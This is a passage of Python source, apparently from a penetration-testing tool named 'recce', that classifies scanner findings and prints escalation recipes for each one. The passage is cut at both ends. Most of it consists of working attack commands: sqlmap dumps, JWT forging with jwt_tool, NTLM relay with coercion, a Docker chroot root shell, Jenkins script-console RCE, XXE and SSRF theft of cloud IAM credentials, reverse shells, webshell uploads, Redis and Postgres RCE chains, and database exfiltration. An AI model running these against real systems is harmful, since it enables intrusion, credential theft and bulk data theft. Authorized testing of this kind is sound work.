            "FP only if a WAF blocks the console despite the debugger banner."]
    if "ignition" in t:
        return CONFIRMED, [
            "recce reached Laravel Ignition's debug endpoint (APP_DEBUG=true). On Laravel "
            "< 8.4.2 this is unauthenticated RCE (CVE-2021-3129).",
            "Exploit within ROE: the public CVE-2021-3129 PoC (phpggc + the "
            "execute-solution log-poisoning chain) yields a shell as the web user.",
            "FP only if the Laravel/Ignition version is already patched."]
    return CONFIRMED, [
        "recce observed a framework debug page (DEBUG on) that leaks source, the "
        "configuration and secrets (SECRET_KEY, DB creds, env) - directly observed.",
        "Harvest the leaked secrets and spray them; the disclosed source + routes map "
        "the rest of the attack surface (within ROE).",
        "FP only if the page is a static error template, not the real debug view."]


def _v_takeover(host, port, vuln):
    b = _blob(vuln)
    svc = next((s for s in ("s3", "github", "heroku", "fastly", "shopify", "azure",
                            "netlify", "surge", "pantheon") if s in b), "the service")
    return CONFIRMED, [
        "recce received the third-party service's 'unclaimed resource' error page on "
        f"this domain - the DNS points at {svc} but nothing is claimed there (directly "
        "observed).",
        f"Claim the {svc} resource (bucket/app/page/site) for this exact name and serve "
        "your content on the domain: phish, steal cookies scoped to the parent domain, "
        "or abuse OAuth redirect_uri allow-lists (within ROE).",
        "FP only if the DNS record was just removed between recce's fetch and now."]


def _v_csp(host, port, vuln):
    return CONFIRMED, [
        "recce read the Content-Security-Policy header and it is bypassable (the listed "
        "weakness is present) - it will not stop the XSS it is meant to mitigate.",
        "It is not directly exploitable on its own; pair it with any reflected/stored "
        "input (see the reflected-XSS / SSTI findings) - the weak CSP lets that payload "
        "execute.",
        "Not applicable - a policy header, verified by reading it."]


def _v_upload(host, port, vuln):
    b = _blob(vuln)
    if "code execution" in b or "was executed" in b:
        return CONFIRMED, [
            "recce uploaded a benign file whose body echoes a SERVER-COMPUTED marker "
            "(tag + 7*7) and fetched it back - the response contained the computed value, "
            "not the source, so the server executed the upload. Remote code execution, "
            "directly proven.",
            "Replace the payload with a real webshell / reverse shell at the same path for "
            "an interactive foothold (within ROE), then delete the artifact.",
            "FP: none - a static file server would have returned the source verbatim, not "
            "the computed marker."]
    if "stored and retrievable" in b or "stored an attacker-named file" in b:
        return LIKELY, [
            "recce uploaded an attacker-named file and fetched it back at a web path (HTTP "
            "200) - unrestricted storage is proven; execution was not (this extension isn't "
            "handled as code here).",
            "Try an executable extension the stack DOES run (.php/.phtml/.asp/.jsp), a "
            "double extension, or a content-type/magic-byte bypass; or use the stored file "
            "for stored-XSS / client-side attacks.",
            "FP: the file may be served from a sandboxed/non-executing store - confirm you "
            "can reach a variant the server treats as code."]
    return LIKELY, [
        "A multipart file-upload form is exposed - an upload attack surface, not yet "
        "exercised (re-run with --upload-shell to actively test it).",
        "Upload a server-computed-marker script and fetch it; a computed marker in the "
        "response = RCE.",
        "FP: the upload may be validated/stored safely - the active test settles it."]


def _v_smuggle(host, port, vuln):
    return LIKELY, [
        "A CL.TE/TE.CL probe (a request bearing both Content-Length and Transfer-Encoding) "
        "stalled the connection near the socket timeout on repeated tries while a "
        "well-formed request returned immediately - the front-end and back-end frame the "
        "body differently (request-smuggling desync signal). recce sent only an incomplete "
        "body, never a smuggled second request.",
        "Prove impact carefully and OUT of a shared cache: send a full CL.TE/TE.CL desync "
        "(smuggled prefix) and observe it prepended to another request (Burp Repeater/HTTP "
        "Request Smuggler) - capture a poisoned response or a stolen request.",
        "FP: a slow/overloaded back-end can also stall - the fast well-formed control and "
        "the two-try repeat reduce but don't eliminate this; confirm with a real desync."]


def _v_cache_poison(host, port, vuln):
    # recce observed an unkeyed header reflected into a response the cache headers say is
    # cacheable - the poisonable condition is directly observed. It stops short of writing
    # a poisoned entry, so the impact side is LIKELY, not CONFIRMED.
    return LIKELY, [
        "recce sent an unkeyed Host-family header (X-Forwarded-Host etc.) and its value "
        "reflected into a response whose own cache headers mark it cacheable - the "
        "poisoning precondition is directly observed (recce did NOT write a poisoned entry).",
        "Prove: with Burp Param Miner / a repeat request, land the reflected value in a "
        "cached entry (match the cache buster + confirm X-Cache: hit), then weaponise the "
        "reflection (redirect to attacker host / inject script) so every visitor is served "
        "it - within ROE, on a non-shared cache.",
        "FP: the value may reflect but the specific URL not actually be cached (vary/keyed "
        "differently) - confirm a second request returns the poisoned copy from cache."]


def _v_deserial(host, port, vuln):
    b = _blob(vuln)
    if "viewstate" in b:
        fam, tool = ".NET ViewState (LOSFormatter)", "ysoserial.net (ViewState plugin)"
    elif "php serialized" in b or "unserialize" in b:
        fam, tool = "PHP object injection", "PHPGGC to build a POP-chain payload"
    else:
        fam, tool = "Java deserialization", "ysoserial to build a gadget-chain payload"
    return LIKELY, [
        f"recce found a serialized-object marker ({fam}) in client-controllable data - a "
        "deserialization sink is reachable with attacker input. The marker is directly "
        "observed; reaching code execution needs a gadget/POP chain on the server's "
        "classpath.",
        f"Prove: replay the request with a {tool} payload and confirm the effect "
        "(sleep/callback/file write) in ROE; a matching side effect = confirmed RCE.",
        "FP: the app may re-serialize its own state and never deserialize your copy - "
        "verify the value round-trips (tamper it and watch for a deserialization error)."]


def _v_xxe(host, port, vuln):
    # recce POSTed an external-entity XML body and the referenced file's content came
    # back - the parser resolved the entity, directly observed -> CONFIRMED.
    return CONFIRMED, [
        "recce POSTed an XML body with an external entity (file:///etc/passwd) and the "
        "response returned the file content - the XML parser resolves external entities "
        "(XXE, directly observed).",
        "Read app config / secrets / source via file://; pivot to SSRF "
        "(<!ENTITY xxe SYSTEM \"http://169.254.169.254/...\">) and internal services; "
        "use a parameter/OOB entity to exfiltrate non-text files (within ROE).",
        "FP: none - the file content in the response proves entity resolution."]


def _v_authbypass_nosql(host, port, vuln):
    # recce submitted a NoSQL operator payload and got an authenticated response the
    # wrong-credential baseline did not - directly observed auth bypass -> CONFIRMED.
    return CONFIRMED, [
        "recce submitted a NoSQL operator payload ($ne/$gt) to the login form and "
        "received an authenticated response that a wrong credential did not - the app "
        "passes objects/operators into a NoSQL auth query (directly observed).",
        "Log in as the first/admin account with the same payload; enumerate other users "
        "via a $regex / $where injection to pull every account (within ROE).",
        "FP only if the 'success' response wasn't truly authenticated (a wrong-credential "
        "baseline was compared to guard against that)."]


def _v_cmdi(host, port, vuln):
    # recce injected a shell payload and the RESPONSE carried a shell-computed marker
    # (or scaled the delay) - direct command execution, observed -> CONFIRMED.
    b = _blob(vuln)
    if "time-based" in b:
        return CONFIRMED, [
            "recce injected a `sleep` payload and the response delay scaled with the "
            "sleep argument (~5s vs ~2s) - the app runs our input in a shell (blind OS "
            "command injection, directly observed).",
            "Confirm + escalate within ROE: swap the sleep for `id`/`whoami` via an "
            "out-of-band channel (curl to your listener, or a DNS/HTTP exfil), then a "
            "reverse shell. This is RCE as the web service account.",
            "FP only if an unrelated slow path coincidentally matched both timings."]
    return CONFIRMED, [
        "recce injected a shell payload with computed arithmetic and the response "
        "contained the COMPUTED product (which plain reflection can't produce) - the "
        "app executes our input in a shell (OS command injection, directly observed).",
        "Escalate within ROE: replace the echo with `id`/`whoami`, then a reverse shell "
        "- this is RCE as the web service account. Pivot from there.",
        "FP: none - a shell-computed value in the response is proof of execution."]


def _v_ssrf(host, port, vuln):
    # recce pointed a URL param at the metadata service / file:// and the content came
    # back in the response - the server-side fetch is directly observed -> CONFIRMED.
    b = _blob(vuln)
    if "metadata" in b or "imds" in b or "iam" in b:
        return CONFIRMED, [
            "recce set a URL parameter to the cloud metadata endpoint and the response "
            "returned instance-metadata / IAM content - the server fetched it (SSRF, "
            "directly observed).",
            "Steal the role creds: request /latest/meta-data/iam/security-credentials/"
            "<role> through the same param, then use the AccessKeyId/SecretAccessKey/"
            "Token against the cloud API (within ROE). Pivot to other internal services.",
            "FP only if a proxy legitimately returns metadata to the client."]
    return CONFIRMED, [
        "recce set a URL parameter to an attacker-chosen target and the fetched content "
        "(e.g. /etc/passwd via file://) came back - the server issues requests from our "
        "input (SSRF, directly observed).",
        "Reach internal-only services and cloud metadata through the same param; try "
        "gopher:// for non-HTTP protocol smuggling (within ROE).",
        "FP only if the reflected content wasn't actually server-fetched."]


def _v_api_access(host, port, vuln):
    # recce enumerated the OpenAPI spec, then GET the endpoints itself - the broken
    # auth / IDOR is directly observed (200 with no credential) -> CONFIRMED.
    t = (vuln.title or "").lower()
    if "idor" in t or "bola" in t:
        return CONFIRMED, [
            "recce requested the object-by-id endpoint with two different ids and got "
            "two DIFFERENT objects back, unauthenticated - the id is not "
            "authorization-checked (BOLA, directly observed).",
            "Enumerate every record: for i in $(seq 1 1000); do curl -s <base>/<path "
            "with i>; done  (within ROE); mine the dumped objects for PII / secrets.",
            "FP only if the differing bodies were error pages, not real objects."]
    return CONFIRMED, [
        "recce GET spec-declared-secured API endpoints with NO credential and they "
        "returned 200 with data - broken authentication / missing access control "
        "(directly observed).",
        "Call the full surface unauthenticated (the spec maps every path/param); pull "
        "data and look for state-changing endpoints reachable the same way.",
        "FP only if the endpoints legitimately allow anonymous access despite the spec."]


def _v_web_app(host, port, vuln):
    # Tier-1 niche-app exposures: recce fetched/authenticated the endpoint itself, so
    # each is directly observed -> CONFIRMED, with the app-specific escalation.
    t = (vuln.title or "").lower()
    if "jenkins script console" in t:
        return CONFIRMED, [
            "recce reached the Jenkins Groovy script console on an unauthenticated GET "
            "(the console form came back) - that IS arbitrary code execution as the "
            "Jenkins process.",
            "RCE within ROE: curl <url>/scriptText --data-urlencode "
            "'script=println \"id\".execute().text'  (or use the web console)."]
    if "grafana" in t and ("traversal" in t or "file read" in t):
        return CONFIRMED, [
            "recce read /etc/passwd through the Grafana plugin path traversal "
            "(CVE-2021-43798) - the response carried the root:...:0:0: line.",
            "Read app secrets next: /public/plugins/<plugin>/../../.../conf/defaults.ini "
            "and the Grafana DB for admin hashes / datasource creds (within ROE)."]
    if "elasticsearch readable" in t:
        return CONFIRMED, [
            "recce listed Elasticsearch indices with no credential - the cluster serves "
            "reads unauthenticated.",
            "Dump it: curl <url>/_search?size=100 ; enumerate indices for PII/secrets."]
    if "keycloak admin console" in t:
        return CONFIRMED, [
            "recce reached the Keycloak admin console unauthenticated (the console app "
            "loaded) - identity for every federated app sits behind it.",
            "Try default admin/admin at the console; a working login = realm/user takeover."]
    if "vault" in t:
        return CONFIRMED, [
            "recce read the Vault seal-status API unauthenticated (version + sealed state "
            "returned) - the API is network-reachable.",
            "If it is dev-mode / a token leaks, read every secret (vault kv get ...); "
            "otherwise this is version + exposure recon (match the version to CVEs)."]
    if "kibana" in t:
        return CONFIRMED, [
            "recce read the Kibana status/version endpoint - the version maps to known "
            "CVEs (several prototype-pollution -> RCE chains).",
            "Match it: searchsploit kibana <version>; pivot to the ES cluster behind it."]
    if "default" in t and "credential" in t:
        return CONFIRMED, [
            "recce authenticated with a documented default credential (the login request "
            "returned an authenticated session/cookie) - directly observed.",
            "Log in with the same creds and pivot: admin of this app is usually a foothold "
            "to secrets / RCE (pipelines, datasources, object storage, realms)."]
    return CONFIRMED, ["recce observed this exposure directly (see the finding output)."]


def _v_lfi(host, port, vuln):
    return CONFIRMED, [
        "recce injected a traversal sequence and the response came back with the target "
        "file's contents (root:...:0:0: for /etc/passwd, or a win.ini section) - the app "
        "builds a file path from our input (directly observed).",
        "Read app secrets next within ROE: config/.env, source files, cloud-cred files, "
        "or /proc/self/environ; a PHP wrapper (php://filter) often escalates to code.",
        "FP only if the file content was static page text - recce matched the file's own "
        "signature, so that's unlikely."]


def _v_open_redirect(host, port, vuln):
    return CONFIRMED, [
        "recce set the parameter to an attacker host and the server answered a 3xx whose "
        "Location pointed at that host (directly observed - the redirect target is "
        "attacker-controlled).",
        "Weaponise within ROE: use it for phishing landing pages, or to smuggle a token/"
        "code through an OAuth redirect_uri where the app trusts this endpoint.",
        "FP only if the app hard-limits the final destination despite the reflected "
        "Location (rare) - judge business impact, not existence."]


def _v_sqli(host, port, vuln):
    # recce injected SQL and observed the database respond (an error, a boolean
    # differential, or a controlled time delay) - a direct observation -> CONFIRMED.
    t = (vuln.title or "").lower()
    if "error-based" in t:
        how = ("a database error surfaced the moment recce broke out of the quote - the "
               "app concatenates our input into the query")
    elif "time-based" in t:
        how = ("recce's sleep payload delayed the response and the delay scaled with the "
               "sleep argument - our injected SQL controls execution")
    else:
        how = ("a TRUE condition returned the baseline page and a FALSE one returned a "
               "different page, reproducibly - the app evaluates our injected boolean")
    return CONFIRMED, [
        f"recce actively confirmed the injection: {how} (directly observed).",
        "Weaponise within ROE with sqlmap, pre-filled: sqlmap -u '<url>' "
        "-p '<param>' --batch --dbs   (add --data for POST forms); then --dump the "
        "interesting tables.",
        "FP only if the differential/error was environmental - recce re-tested to rule "
        "that out before raising this."]


def _v_ssti(host, port, vuln):
    return CONFIRMED, ["recce injected a template expression and the engine evaluated it (7*7 -> 49 "
                       "next to our canary) - that IS code execution in the template context, "
                       "directly confirmed.",
                       "Identify the engine and escalate to full RCE with tplmap or the engine-specific "
                       "payloads (Jinja2/Twig/Freemarker/ERB) - within ROE."]


def _v_jwt(host, port, vuln):
    t = (vuln.title or "").lower()
    blob = f"{t} {(vuln.output or '').lower()}"
    if "algorithm confusion" in t or "algorithm-confusion" in t:
        if "accepted" in t:
            return CONFIRMED, [
                "recce recovered the RSA public key from the server's JWKS, forged an "
                "HS256 token signed with that public key, and replayed it - the server "
                "returned the SAME authenticated response as the real token (RS256->HS256 "
                "confusion, directly proven).",
                "Use the forged token in the finding as any user/admin (set sub/role); "
                "mint tokens at will for full auth bypass / privilege escalation (in ROE).",
                "FP: none - the server accepted a token we signed with only the public key."]
        return LIKELY, [
            "recce recovered the RSA public key from JWKS and minted an HS256 token signed "
            "with it (RS256->HS256 confusion). Whether it's accepted depends on the "
            "verifier.",
            "Prove: replay the forged token (in the finding) on a token-gated endpoint; a "
            "200/authorized response = real (jwt_tool -X k -pk public.pem)."]
    if "hmac secret cracked" in t or "secret cracked" in t:
        return CONFIRMED, [
            "recce recovered the JWT's HMAC signing secret by offline brute force - the "
            "HMAC verification is exact, so this IS the secret (not a guess).",
            "Forge any token: sign {sub/admin/role: <target>} with the recovered secret "
            "(jwt_tool <token> -S hs256 -p '<secret>' -T) and replay it for full auth "
            "bypass / account takeover / privilege escalation (within ROE).",
            "FP: none - a matching HMAC signature is cryptographic proof of the secret."]
    if "alg:none" in t and ("proven" in t or "the server returned the same authenticated" in blob):
        return CONFIRMED, [
            "recce actively proved this: it forged an unsigned token (alg:none, original "
            "claims plus a marker) and replayed it - the server returned the SAME "
            "authenticated response as the real token but a different one with no token, so "
            "the signature is not verified.",
            "Escalate within ROE: re-issue the forged token with elevated claims "
            "(role/admin/sub) via jwt_tool -X a to take over any account."]
    if "forged token rejected" in t:
        return FALSE_POSITIVE, [
            "recce replayed a forged alg:none token and the server treated it like no token "
            "at all - unsigned tokens are rejected on the tested path. Issuing alg:none is a "
            "smell, but it isn't exploitable here."]
    if "alg:none" in t or "alg=none" in t:
        return LIKELY, ["The token advertises alg=none (observed). If the server honours it, tokens are "
                        "forgeable with any claims.",
                        "Prove: jwt_tool <token> -X a  (strip the signature, set alg=none) and replay it - "
                        "a 200/authorized response = real; rejected = the server pins the algorithm (FP)."]
    if "symmetric" in t or "hs256" in t or "hs384" in t:
        return LIKELY, ["HMAC-signed JWT: if the secret is weak it cracks offline, then you forge tokens.",
                        "Prove: jwt_tool <token> -C -d rockyou.txt  (or hashcat -m 16500). A crack = real."]
    return LIKELY, ["Asymmetric JWT: test the RS256->HS256 algorithm-confusion attack.",
                    "Prove: jwt_tool <token> -X k -pk public.pem  (sign with the public key as an HS256 "
                    "secret); an accepted forged token = real."]


def _v_web_methods(host, port, vuln):
    blob = f"{vuln.title} {vuln.output}".lower()
    if "proven" in blob or "confirmed" in blob or "returned the uploaded" in blob:
        return CONFIRMED, [
            "recce actively proved this: it PUT a marker file and read it back "
            "(then DELETE'd it) - an arbitrary file-write primitive, observed, not "
            "merely advertised.",
            "Escalate within ROE: PUT a web shell / overwrite a served file."]
    return LIKELY, ["The server advertised the method(s) in its OPTIONS Allow header (observed).",
                    "Prove impact non-destructively: curl -sk -X PUT <url>/recce_poc.txt -d 'recce_poc' "
                    "then GET it back. A stored file = real upload primitive; 403/405 = advertised but "
                    "not actually allowed (FP)."]


def _v_default_creds(host, port, vuln):
    return LIKELY, ["Default/weak credentials are only proven by trying them (mind account-lockout policy so "
                    "you don't lock the account).",
                    "Prove: nxc <proto> <ip> -u <default-user> -p <default-pass> (or the product's documented "
                    "default login). A successful auth = CONFIRMED; failures across the known defaults = FP."]


# --- version->CVE verdicts (adjudicate the offline version-DB matches) -----------

def _v_version_cve(host, port, vuln):
    """A version-based CVE match from recce's offline DB. The match itself is a fact
    (the running version falls in the affected range), but exploitability is not
    proven from a banner - Linux distros routinely backport the fix without changing
    the version string. Verdict LIKELY with that honest caveat; the recipe's finish
    command is the safe check that turns it into CONFIRMED/FP."""
    prod, ver = _pv(host, vuln)
    if not ver:
        return INCONCLUSIVE, [
            "The finding is version-based but no service version was captured to reason "
            "over. Grab it: nmap -sV -p<port> <ip> (or the service banner)."]
    return LIKELY, [
        f"recce's offline vuln DB matched {prod or 'the service'} {ver} to this issue "
        "because the version falls in the affected range - a real version match.",
        "Version alone is not proof of exploitability: distributions (Debian/Ubuntu/RHEL) "
        "backport security fixes WITHOUT bumping the banner version, so a patched host can "
        "still show an affected version string.",
        "Run the finish command to confirm before reporting as exploitable; a hardened/"
        "backported build that resists it is the false positive."]


def _v_eol(host, port, vuln):
    """End-of-life / unsupported software. Here the version match IS the proof: the
    running build is directly observed and is out of support, regardless of any
    backport (an EOL branch receives no security updates by definition)."""
    prod, ver = _pv(host, vuln)
    if ver:
        return CONFIRMED, [
            f"{prod or 'The service'} {ver} is a directly-observed, end-of-life build - "
            "its branch is out of vendor support and receives no security updates.",
            "This is a version fact, not an exploit guess: the exposure is the "
            "unsupported software itself. Impact is the accumulated unpatched surface; "
            "remediation is to upgrade to a supported release."]
    return LIKELY, ["The service was flagged as end-of-life but no exact version was "
                    "captured. Confirm the build with nmap -sV -p<port> <ip>."]


def _v_openssh_regresshion(host, port, vuln):
    """regreSSHion (CVE-2024-6387) - affects OpenSSH 8.5p1..<9.8p1 (and <4.4p1) on
    glibc Linux; 9.8p1+ is fixed. Adjudicate from the observed version."""
    prod, ver = _pv(host, vuln)
    if not ver or "openssh" not in (prod or "").lower() and "openssh" not in _blob(vuln):
        return INCONCLUSIVE, ["No OpenSSH version captured; grab the banner: nc <ip> 22."]
    # A bare "9.8" (non-portable/OpenBSD, no pN suffix) is the fixed release too, but
    # sorts BELOW "9.8p1" in _cmp - so match it explicitly or it falls to a false LIKELY.
    fixed = _cmp(ver, "9.8p1") >= 0 or ("p" not in ver.lower() and _cmp(ver, "9.8") >= 0)
    if fixed:
        return FALSE_POSITIVE, [
            f"OpenSSH {ver} is >= 9.8p1, the release that FIXES regreSSHion -> not "
            "vulnerable. Dismiss (this is a common over-flag)."]
    if _cmp(ver, "8.5p1") >= 0 or _cmp(ver, "4.4p1") < 0:
        return LIKELY, [
            f"OpenSSH {ver} is in the regreSSHion-affected window (8.5p1..<9.8p1, or "
            "pre-4.4p1).",
            "Exploitation is glibc/Linux-specific and requires winning a signal-handler "
            "race over many thousands of attempts - version-vulnerable, but confirm the "
            "target is glibc Linux and the fix isn't backported (Debian/Ubuntu patched "
            "in place).",
            "Non-destructive confirm: check the distro's patched-package version, or run "
            "the public detection script; the full PoC is noisy and can crash sshd (lab/ROE)."]
    return FALSE_POSITIVE, [
        f"OpenSSH {ver} sits between 4.4p1 and 8.5p1 - the regression was NOT present in "
        "that window. Not vulnerable to regreSSHion."]


def _v_exchange(host, port, vuln):
    return LIKELY, [
        "An internet/intranet-facing Exchange/OWA endpoint is a prime target for the "
        "ProxyLogon (CVE-2021-26855 SSRF -> RCE) and ProxyShell chains, but the exact "
        "vulnerable state depends on the CU/patch level, which a banner rarely reveals.",
        "Confirm the build: the OWA version string maps to a CU/patch date - compare it "
        "to Microsoft's fixed builds; or run a safe checker "
        "(e.g. the ProxyLogon/ProxyShell scanner in check-only mode).",
        "A fully patched Exchange (post-mitigation) that resists the checks is the FP."]


# --- recipe registry ------------------------------------------------------------
# match: regex over (title + script_id + CVEs + output). fn: the verdict function.

_RECIPES: list[dict] = [
    {"id": "activemq-cve-2023-46604", "match": r"activemq|cve-2023-46604",
     "name": "Apache ActiveMQ OpenWire RCE (CVE-2023-46604)",
     "pre": ["OpenWire transport (tcp/61616) reachable", "ActiveMQ < 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3"],
     "finish": "msf: exploit/multi/misc/apache_activemq_rce_cve_2023_46604 (set RHOSTS/RPORT 61616, "
               "a check-only run first), or the public X1r0z/ActiveMQ-RCE PoC - within ROE.",
     "fp": "A patched build (>= the branch fix), or only the 8161 web console open while 61616 is firewalled.",
     "fn": _v_activemq},
    {"id": "smb-signing-relay", "match": r"signing not required|smb.?security.?mode|smb2?-security|message signing",
     "name": "SMB signing not required (NTLM relay)",
     "pre": ["SMB (445) reachable", "Message signing not required on the target"],
     "finish": "ntlmrelayx.py -t smb://<ip> -smb2support  then coerce auth (PetitPotam / printerbug) from a "
               "victim - lab/ROE. Quick confirm: nxc smb <ip> --gen-relay-list relays.txt.",
     "fp": "Signing REQUIRED (DCs require it by default) -> relay blocked.",
     "fn": _v_smb_signing},
    {"id": "smbv1-enabled",
     "match": r"smbv1 \(legacy|legacy protocol\) enabled|smbv1.{0,24}enabled|"
              r"enabled.{0,24}smbv1",
     "name": "SMBv1 (legacy protocol) enabled",
     "pre": ["SMB (445) reachable", "The host answers an SMBv1 NEGOTIATE"],
     "finish": "nmap --script smb-vuln-ms17-010 -p445 <ip> (non-intrusive) to separate "
               "'legacy protocol on' from 'remotely exploitable now'.",
     "fp": "The host does NOT answer SMBv1 (recce would not have raised this).",
     "fn": _v_smbv1},
    {"id": "ms17-010", "match": r"ms17-010|eternalblue|cve-2017-0143|cve-2017-0144",
     "name": "MS17-010 EternalBlue (SMBv1 RCE)",
     "pre": ["SMBv1 (445) reachable", "Host missing MS17-010"],
     "finish": "nmap --script smb-vuln-ms17-010 -p445 <ip> (non-intrusive) to prove; then AutoBlue-MS17-010 "
               "or msf exploit/windows/smb/ms17_010_eternalblue in ROE.",
     "fp": "The NSE check reports NOT VULNERABLE (patched), or SMBv1 is disabled.",
     "fn": _v_ms17},
    {"id": "smbghost-cve-2020-0796", "match": r"smbghost|cve-2020-0796|coronablue",
     "name": "SMBGhost SMBv3 compression RCE (CVE-2020-0796)",
     "pre": ["Windows 10 / Server build 1903 or 1909", "SMBv3.1.1 with compression"],
     "finish": "public detection checker (ollypwn SMBGhost_scanner) to confirm the compression capability; "
               "PoC only in a lab (it bugchecks).",
     "fp": "Any build other than 1903/1909 -> not affected.",
     "fn": _v_smbghost},
    {"id": "seimpersonate-potato", "match": r"seimpersonate|seassignprimarytoken|godpotato|printspoofer|"
                                            r"juicypotato|potato|roguepotato|efspotato",
     "name": "SeImpersonate -> SYSTEM (Potato family)",
     "pre": ["Code exec as an account that HOLDS SeImpersonate/SeAssignPrimaryToken (Enabled)",
             "A supported Windows build (all current builds are supported by GodPotato)"],
     "finish": "on-target: GodPotato -cmd \"cmd /c whoami\"  (expect: nt authority\\system) - within ROE.",
     "fp": "The privilege is present but DISABLED, or you don't actually have code exec in that token yet.",
     "fn": _v_potato},
    {"id": "smb-writable-share", "match": r"writable smb share",
     "name": "Writable SMB share (proven)",
     "pre": ["SMB (445) reachable", "Write access to a non-admin share"],
     "finish": "smbclient //<ip>/<share> -N -c 'put poison.scf'  then capture NetNTLM "
               "with Responder, or drop a web shell if the share backs a web root.",
     "fp": "None - recce already wrote and read back a marker file.",
     "fn": _v_smb_writable},
    {"id": "smb-null-session", "match": r"null session|anonymous.*smb|smb.*anonymous|guest.*access|"
                                        r"smb-enum-shares",
     "name": "SMB null / anonymous session",
     "pre": ["SMB (445/139) reachable", "Anonymous or guest access permitted"],
     "finish": "nxc smb <ip> -u '' -p '' --shares  (or enum4linux-ng -A <ip>).",
     "fp": "Access denied without credentials -> FP.",
     "fn": _v_nullsession},
    {"id": "kubernetes-exposure",
     "match": r"kubelet|kubernetes api|anonymous resource listing|etcd exposed|"
              r"read-only port|accepts anonymous requests|kube-apiserver",
     "name": "Kubernetes unauthenticated exposure",
     "pre": ["A Kubernetes surface (kubelet/apiserver/etcd) reachable",
             "No authentication enforced on the probed endpoint"],
     "finish": "kubeletctl exec / kubectl --as=system:anonymous get secrets -A / etcdctl "
               "get /registry/secrets - within ROE; recce only READ to prove it.",
     "fp": "The endpoint required auth and rejected the read.",
     "fn": _v_k8s},
    {"id": "docker-api",
     "match": r"docker engine api|docker api.*(exposed|unauth)|exposed.*docker|"
              r"docker.*without authentication|docker container/image inventory",
     "name": "Exposed Docker Engine API (unauthenticated root RCE)",
     "pre": ["Docker API (2375/2376) reachable", "No authentication / mutual-TLS enforced"],
     "finish": "docker -H <scheme>://<ip>:<port> run --rm -v /:/host -it alpine chroot "
               "/host sh  (root shell on the host - ROE); recce only READ the API to prove it.",
     "fp": "The port enforces mutual-TLS (2376 --tlsverify) and rejected the read.",
     "fn": _v_docker_api},
    {"id": "ldap-anon-read",
     "match": r"anonymous ldap directory read|anonymous.*directory read",
     "name": "Anonymous LDAP directory read (unauthenticated disclosure)",
     "pre": ["LDAP reachable", "Anonymous bind accepted", "Naming context readable anonymously"],
     "finish": "ldapsearch -x -H ldap://<ip> -b <base> '(objectClass=user)' "
               "sAMAccountName servicePrincipalName description  (recce already read it).",
     "fp": "The anonymous read was actually denied (recce would not have raised this).",
     "fn": _v_ldap},
    {"id": "ldap-cleartext",
     "match": r"ldap over cleartext|cleartext.{0,6}ldap|ldap.{0,12}no tls",
     "name": "Cleartext LDAP (no TLS on 389) - sniff / relay surface",
     "pre": ["LDAP simple bind accepted on cleartext 389", "No LDAPS/StartTLS enforced"],
     "finish": "relay coerced NTLM auth to LDAP: ntlmrelayx.py -t ldap://<ip> "
               "--escalate-user <user>; or sniff a real bind (tcpdump 'tcp port 389').",
     "fp": "The server actually enforces LDAPS/StartTLS + signing (bind would be refused).",
     "fn": _v_ldap},
    {"id": "ldap-anon-bind",
     "match": r"anonymous ldap bind",
     "name": "Anonymous LDAP bind allowed",
     "pre": ["LDAP reachable", "Simple bind with empty credentials accepted"],
     "finish": "ldapsearch -x -H ldap://<ip> -b '' -s base '(objectClass=*)', then try "
               "-b the naming context; nxc ldap <ip> -u '' -p '' --users.",
     "fp": "The anonymous bind was actually refused (recce would not have raised this).",
     "fn": _v_ldap},
    {"id": "snmp-community",
     "match": r"snmp readable with a guessable community|guessable community string|"
              r"snmp exposes local user|snmp exposes process",
     "name": "SNMP readable with a guessable community string",
     "pre": ["SNMP (161/udp) reachable", "A default/guessable community string is accepted"],
     "finish": "snmpwalk -v2c -c <community> <ip>  (or snmp-check <ip> -c <community>) - "
               "recce already read data back to prove it.",
     "fp": "The community was actually refused (recce would not have raised this).",
     "fn": _v_snmp},
    {"id": "mongodb-unauth",
     "match": r"mongodb exposed without authentication|mongodb.*(no auth|unauth)|"
              r"mongodb end-of-life|mongodb.*legacy build|"
              r"mongodb replica-set member exposed",
     "name": "MongoDB exposed without authentication",
     "pre": ["MongoDB (27017-27019) reachable", "listDatabases answered with no credential"],
     "finish": "mongosh mongodb://<ip>:<port>/ --eval 'db.adminCommand({listDatabases:1})' "
               "then mongodump --host <ip> --port <port> --out loot/  (recce already read it).",
     "fp": "The server actually enforced auth and returned an error.",
     "fn": _v_mongodb},
    {"id": "mongodb-datamine",
     "match": r"mongodb sensitive data|mongodb.*(pii|secrets|credentials)|"
              r"mongodb credentialed access",
     "name": "MongoDB sensitive data / credentialed access",
     "pre": ["MongoDB reachable", "Read access to collections with sensitive fields"],
     "finish": "mongosh mongodb://<ip>:<port>/ --eval "
               "'db.getSiblingDB(\"<db>\").<coll>.find().limit(100)' to pull full docs; "
               "spray harvested connection strings (ROE).",
     "fp": "The flagged fields hold non-sensitive data despite their names.",
     "fn": _v_mongodb},
    {"id": "redis-unauth",
     "match": r"redis exposed without authentication|redis.*(no auth|unauth)|"
              r"redis end-of-life|redis.*legacy build",
     "name": "Redis exposed without authentication",
     "pre": ["Redis (6379/6380) reachable", "INFO answered with no credential"],
     "finish": "redis-cli -h <ip> -p <port> INFO ; KEYS '*'  then the CONFIG SET dir + "
               "SAVE file-write chain for RCE (recce already read it).",
     "fp": "The server actually enforced auth (-NOAUTH).",
     "fn": _v_redis},
    {"id": "postgres-rce",
     "match": r"postgresql.*(rce|copy from program)|copy \.\.\. from program",
     "name": "PostgreSQL superuser -> COPY FROM PROGRAM RCE",
     "pre": ["PostgreSQL (5432) reachable", "The role is a superuser / can COPY FROM PROGRAM"],
     "finish": "psql '...' -c \"CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; "
               "TABLE r;\" (benign) then the ROE command; or a plpython3u/plperlu function.",
     "fp": "The role is not a superuser and lacks pg_execute_server_program.",
     "fn": _v_postgres},
    {"id": "postgres-datamine",
     "match": r"postgresql sensitive data|postgresql.*(pii|secrets|credentials)",
     "name": "PostgreSQL sensitive data exposed",
     "pre": ["PostgreSQL (5432) reachable", "Read access to databases with sensitive columns"],
     "finish": "psql '...' -c 'SELECT * FROM <schema>.<table> LIMIT 100' to pull the full "
               "rows; spray harvested connection strings (within ROE).",
     "fp": "The flagged columns hold non-sensitive data despite their names.",
     "fn": _v_postgres},
    {"id": "postgres-pivot",
     "match": r"postgresql lateral pivot|dblink / postgres_fdw",
     "name": "PostgreSQL lateral pivot (dblink / postgres_fdw)",
     "pre": ["A working DB session", "dblink/postgres_fdw reachable or a foreign server"],
     "finish": "SELECT dblink_connect('h','host=<internal-db> ...'); dblink('h','SELECT "
